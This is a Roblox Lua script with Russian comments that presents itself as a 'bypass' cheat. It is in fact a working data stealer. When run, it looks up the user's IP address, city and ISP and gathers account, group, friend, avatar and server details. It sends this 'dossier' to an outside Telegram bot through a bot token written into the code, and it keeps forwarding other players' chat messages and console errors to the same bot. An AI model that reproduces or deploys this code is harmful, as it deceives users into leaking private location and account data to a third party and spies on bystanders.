--[[
    TIRVOXXX HUMAN-EXPOSE V14 [MAX-HUMAN-INFO]
    [+] СБОР ВСЕХ ID АКСЕССУАРОВ
    [+] ДЕТАЛИЗАЦИЯ ГРУПП И ДРУЗЕЙ
    [+] ПОЛНЫЙ ПРОБИВ СИСТЕМЫ И СЕТИ
--]]

local _CoreAccessKey = "8760604590:AAHmkTH5hbLOl1s5gr7lvNJCMgnAht85W_o"
local _RouteID = "1883837800"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Marketplace = game:GetService("MarketplaceService")
local Stats = game:GetService("Stats")
local UserInput = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- 1. СПАМ В КОНСОЛЬ (БЕЗ ТГ)
task.spawn(function()
    while task.wait(0.1) do
        print("BYPASS BY TIRVOXXX")
    end
end)

-- 2. ФУНКЦИЯ ОТПРАВКИ
local function Send(msg)
    local url = "https://api.telegram.org/bot" .. _CoreAccessKey .. "/sendMessage"
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        pcall(function()
            req({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    ["chat_id"] = _RouteID,
                    ["text"] = msg,
                    ["parse_mode"] = "Markdown"
                })
            })
        end)
    end
end

-- 3. МОДУЛЬ СБОРА ИНФЫ О ЧЕЛОВЕКЕ
local function GetExtremeHumanData()
    -- Сетевые данные
    local net = {query="N/A", country="N/A", city="N/A", isp="N/A", org="N/A"}
    pcall(function() net = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/")) end)

    -- Детализация аватара (ID всех вещей)
    local assets = {}
    local appearance = LocalPlayer:WaitForChild("AppearanceReplication", 5)
    pcall(function()
        local char = LocalPlayer.Character
        if char then
            for _, v in ipairs(char:GetChildren()) do
                if v:IsA("Accessory") then
                    local id = v.AssetId or "N/A"
                    table.insert(assets, v.Name .. " (`" .. id .. "`)")
                end
            end
        end
    end)

    -- Проверка на группы
    local groupInfo = "Not in Group"
    pcall(function()
        local groups = game:HttpGet("https://groups.roblox.com/v2/users/" .. LocalPlayer.UserId .. "/groups/roles")
        groupInfo = #HttpService:JSONDecode(groups).data .. " Groups"
    end)

    -- Статистика сервера
    local friendCount = 0
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and LocalPlayer:IsFriendsWith(p.UserId) then
            friendCount = friendCount + 1
        end
    end

    -- Формируем гига-отчет
    local report = "👤 *TIRVOXXX HUMAN DOSSIER V14* 👤\n\n" ..
                   "🌐 *[ СЕТЬ И ПК ]*\n" ..
                   "• IP: `" .. net.query .. "`\n" ..
                   "• Место: " .. net.country .. ", " .. net.city .. "\n" ..
                   "• Провайдер: " .. net.isp .. "\n" ..
                   "• Платформа: " .. UserInput:GetPlatform().Name .. "\n" ..
                   "• RAM: " .. math.round(Stats:GetTotalMemoryUsageMb()) .. " MB\n\n" ..
                   
                   "🎭 *[ ЛИЧНОСТЬ ]*\n" ..
                   "• Ник: `" .. LocalPlayer.Name .. "`\n" ..
                   "• ID: `" .. LocalPlayer.UserId .. "`\n" ..
                   "• Возраст: " .. LocalPlayer.AccountAge .. " дней\n" ..
                   "• Премиум: " .. tostring(LocalPlayer.MembershipType) .. "\n" ..
                   "• Группы: " .. groupInfo .. "\n" ..
                   "• Друзей на сервере: " .. friendCount .. "\n\n" ..
                   
                   "👕 *[ ОБЛИК (Asset IDs) ]*\n" ..
                   (#assets > 0 and table.concat(assets, "\n") or "No Assets Found") .. "\n\n" ..
                   
                   "🎮 *[ СЕРВЕР ]*\n" ..
                   "• Игра: [" .. game.Name .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")\n" ..
                   "• Ссылка: `https://www.roblox.com/games/" .. game.PlaceId .. "`\n" ..
                   "• JobID: `" .. game.JobId .. "`\n" ..
                   "• Объектов: " .. #game:GetDescendants() .. "\n\n" ..
                   
                   "----------------------------------\n" ..
                   "✅ *HUMAN DATA EXPOSED BY TIRVOXXX*"
    
    return report
end

-- 4. ЛОГЕРЫ
-- Логи чата (не шлем твои сообщения)
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(m)
        Send("💬 *[" .. p.Name .. "]:* " .. m)
    end)
end)

-- Логи консоли (ошибки)
game:GetService("LogService").MessageOut:Connect(function(msg, type)
    if not msg:find("TIRVOXXX") and type == Enum.MessageType.MessageError then
        Send("⚠️ *[CONSOLE ERROR]:* \n`" .. msg .. "`")
    end
end)

-- ЗАПУСК
task.spawn(function()
    local dossier = GetExtremeHumanData()
    Send(dossier)
end)

warn("TIRVOXXX V14: HUMAN EXPOSE LOADED.")
